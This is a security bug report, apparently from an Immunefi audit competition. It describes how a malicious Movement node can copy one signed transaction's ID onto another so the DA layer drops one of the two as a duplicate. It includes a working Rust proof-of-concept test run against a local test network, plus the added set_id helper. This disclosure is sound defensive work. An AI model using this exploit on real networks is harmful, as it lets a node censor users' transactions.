# 41714 \[BC-High] tampering the id of signed transactions to prevent others from executing

## #41714 \[BC-High] Tampering the ID of signed transactions to prevent others from executing

**Submitted on Mar 17th 2025 at 18:32:40 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #41714
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

### Description

## Vulnerability Details

### The format of transactions submitted to the sequencer

Transactions are represented as:

```
pub struct Transaction {
	data: Vec<u8>,
	application_priority: u64,
	sequence_number: u64,
	id: Id,
}
```

`data` is a `SignedTransaction` turned into a bytes array:

```
pub struct SignedTransaction {
    /// The raw transaction
    raw_txn: RawTransaction,

    /// Public key and signature to authenticate
    authenticator: TransactionAuthenticator,

    /// A cached size of the raw transaction bytes.
    /// Prevents serializing the same transaction multiple times to determine size.
    #[serde(skip)]
    raw_txn_size: OnceCell<usize>,

    /// A cached size of the authenticator.
    /// Prevents serializing the same authenticator multiple times to determine size.
    #[serde(skip)]
    authenticator_size: OnceCell<usize>,

    /// A cached hash of the transaction.
    #[serde(skip)]
    committed_hash: OnceCell<HashValue>,
}
```

When the DA layer receives a `Transaction` before including it in the mempool it verifies the following:

* The transaction's signature is valid
* The transaction ID does not exist in the mempool pool already

During this process, there are no checks to validate whether the transaction `id` received in the blob is legit, or an arbitrary value set by a malicious node.

```
pub struct Transaction {
	data: Vec<u8>,
	application_priority: u64,
	sequence_number: u64,
	id: Id, // <<-----
}
```

This value should be recalculated instead of blindly trusting the node submitting the transaction to set the correct `id` for the transaction.

### Tampering the ID to prevent another transaction from being added to the mempool

Suppose there are 2 transactions, one is from `Bob` with ID **0xAA** and the other one is from `Alice` with ID **0xBB**.

```
[
		Bob_Transaction {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 0,
			id: 0xAA,
		},
		Alice_Transaction {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 0,
			id: 0xBB,
		}
]
```

When submitting a batch of transaction blobs a node can't manipulate the value inside `.data` because it is signed and the DA layer verifies its signature.

But there are no checks on the validity of the `ID` in the DA layer, therefore, the node can manually set the ID of Bob\_Transaction to be the one of Alice\_Transaction and submit the blobs:

```
[
		Bob_Transaction {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 0,
			id: 0xBB,
		},
		Alice_Transaction {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 0,
			id: 0xBB,
		}
]
```

As a consequence, only one of the transactions will be sequenced, because the system believes he already added to the mempool the other transaction based on its ID.

### Example

Bob sends funds to Alice in a transaction and Alice sends an NFT to Bob in a different transaction.

Maliciously manipulating transaction IDs in a batch of txs allows for only one of the 2 transactions to get processed.

## Impact Details

Causing network processing nodes to process transactions beyond set parameters. Tampering the ID of signed transactions may prevent others from executing.

### Proof of Concept

### Proof of Concept

In the proof of concept below Alice sends funds to Bob in a transaction and Bob sends funds to Alice in a different transaction.

Maliciously, a node sets Alice's transaction ID to the same value as Bob's transaction ID before submitting a batch write to the DA layer.

As a result, only one of the transactions gets processed.

Add the test to the file `./attackathon-movement/protocol-units/da/movement/protocol/tests/src/test/e2e/raw/sequencer.rs`, import modules if needed.

```
#[tokio::test]
async fn test_light_node_capy_poc() -> Result<(), anyhow::Error> {
   let mut client = LightNodeServiceClient::connect("http://0.0.0.0:30730").await?;

   // Create accounts
   let alice = LocalAccount::generate(&mut rand::rngs::OsRng);
   let bob = LocalAccount::generate(&mut rand::rngs::OsRng);

   println!("alice address: {:?}", alice.address());
   println!("bob address: {:?}", bob.address());

   // Fund account
   let faucet_client = FaucetClient::new(Url::parse("http://0.0.0.0:30732").expect("reason"), Url::parse("http://0.0.0.0:30731").expect("reason"));
   faucet_client.fund(alice.address(), 1_000_000).await.expect("Failed to fund sender account");
   faucet_client.fund(bob.address(), 1_000_000).await.expect("Failed to fund sender account");

   // Create txs
   let amount1: u64 = 100_000;
   let amount2: u64 = 10_000;
   let coin = TypeTag::from_str("0x1::aptos_coin::AptosCoin").expect("");
   // Create a raw transaction from Alice to Bob.
   let transaction_builder1 = TransactionBuilder::new(
       TransactionPayload::EntryFunction(EntryFunction::new(
           ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
           Identifier::new("transfer")?,
           vec![coin.clone()],
           vec![to_bytes(&bob.address())?, to_bytes(&amount1)?],
       )),
       SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
       ChainId::new(27u8),
   )
       .sender(alice.address())
       .sequence_number(alice.sequence_number())
       .max_gas_amount(5_000)
       .gas_unit_price(100);
   // Create a raw transaction from Bob to Alice.
   let transaction_builder2 = TransactionBuilder::new(
       TransactionPayload::EntryFunction(EntryFunction::new(
           ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
           Identifier::new("transfer")?,
           vec![coin.clone()],
           vec![to_bytes(&alice.address())?, to_bytes(&amount2)?],
       )),
       SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
       ChainId::new(27u8),
   )
       .sender(bob.address())
       .sequence_number(bob.sequence_number())
       .max_gas_amount(5_000);

   // create the blob write
   let signed_transaction1 = alice.sign_with_transaction_builder(transaction_builder1);
   let signed_transaction2 = bob.sign_with_transaction_builder(transaction_builder2);
   let txn_hash1 = signed_transaction1.committed_hash();
   let txn_hash2 = signed_transaction2.committed_hash();
   let mut transactions = vec![];
   let serialized_aptos_transaction1 = bcs::to_bytes(&signed_transaction1)?;
   let serialized_aptos_transaction2 = bcs::to_bytes(&signed_transaction2)?;
   let mut movement_transaction1 = Transaction::new(
       serialized_aptos_transaction1,
       0,
       signed_transaction1.sequence_number(),
   );
   let mut movement_transaction2 = Transaction::new(
       serialized_aptos_transaction2,
       0,
       signed_transaction2.sequence_number(),
   );

   // Manually set to Tx 1, the ID of Tx2
   movement_transaction1.set_id(movement_transaction2.id().as_bytes().clone());
   
   // Serialize the request
   let serialized_transaction1 = serde_json::to_vec(&movement_transaction1)?;
   let serialized_transaction2 = serde_json::to_vec(&movement_transaction2)?;
   transactions.push(BlobWrite { data: serialized_transaction1 });
   transactions.push(BlobWrite { data: serialized_transaction2 });
   let batch_write = BatchWriteRequest { blobs: transactions };

   // Submit to the DA a batch write request with both transactions
   let batch_write_reponse = client.batch_write(batch_write).await?;

   Ok(())
}
```

The test is run in a custom malicious node that communicates with the DA layer to submit blobs of transactions. The `set_id` function is added by the malicious node to `./attackathon-movement/util/movement-types/src/transaction.rs`:

```
  // @audit capybara: custom id
	pub fn set_id(&mut self, new_id: [u8; 32]) {
		self.id = Id(new_id);
	}
```

The test will print Alice and Bob addresses like this:

```
running 1 test
alice address: 9c5e38abf9bbecaf5b43fc1b2296301d4768e6d68541d1db9389027f0dabb93b
bob address: ef6673ffd511bc7ebd32dfdd3544030069c9e4177bc44ed3bfba46ca7a768791
test test::e2e::raw::sequencer::test_light_node_capy_poc ... ok
```

> Different values will be shown to you

Verify the balances of Alice and Bob by sending an HTTP request to the REST endpoint:

```
curl "http://localhost:30731/v1/accounts/${ACCOUNT}/resources" | jq '.[1].data.coin.value'
```

> Replace `${ACCOUNT}` with the address of the account

Alice will have 1010000 coins and Bob 989300, which means Alice's transfer did not executed, but Bob's transfer did.

```
alice: 1010000
bob:   989300
```
